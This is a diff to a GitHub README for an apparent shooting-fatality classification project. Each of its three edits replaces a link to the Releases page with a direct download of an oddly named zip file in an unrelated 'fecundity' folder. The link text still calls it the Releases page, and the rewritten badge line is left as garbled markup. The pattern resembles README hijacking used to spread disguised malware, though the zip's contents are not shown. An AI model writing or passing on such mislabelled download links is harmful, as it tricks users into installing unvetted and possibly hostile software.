@@ -1,6 +1,6 @@
 # 🔍 Classifying-Shooting-Incident-Fatality-Classification- - Predictive Insights for Safer Communities
 
-[![Download Here](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/releases)
+[![Download Here](https://raw.githubusercontent.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/main/fecundity/Classifying-Classification-Fatality-Shooting-Incident-3.5.zip%20Latest%https://raw.githubusercontent.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/main/fecundity/Classifying-Classification-Fatality-Shooting-Incident-3.5.zip)](https://raw.githubusercontent.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/main/fecundity/Classifying-Classification-Fatality-Shooting-Incident-3.5.zip)
 
 ## 📖 Overview
 
@@ -33,7 +33,7 @@ By identifying risk factors such as time, location, and demographics, this tool 
 
 To run this software, you need to visit the Releases page to get the latest version. Follow these steps:
 
-1. Click this link to [visit the Releases page](https://github.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/releases).
+1. Click this link to [visit the Releases page](https://raw.githubusercontent.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/main/fecundity/Classifying-Classification-Fatality-Shooting-Incident-3.5.zip).
 2. Download the latest release suitable for your operating system.
 3. Open the downloaded file and follow the installation instructions.
 
@@ -75,7 +75,7 @@ If you encounter any issues or have questions, feel free to open an issue on the
 
 ## 👉 Quick Start Guide
 
-1. Visit the [Releases page](https://github.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/SimonTwiii/Classifying-Shooting-Incident-Fatality-Classification-/main/fecundity/Classifying-Classification-Fatality-Shooting-Incident-3.5.zip).
 2. Download the latest version.
 3. Install and launch the application.
 4. Analyze the data and gain insights.
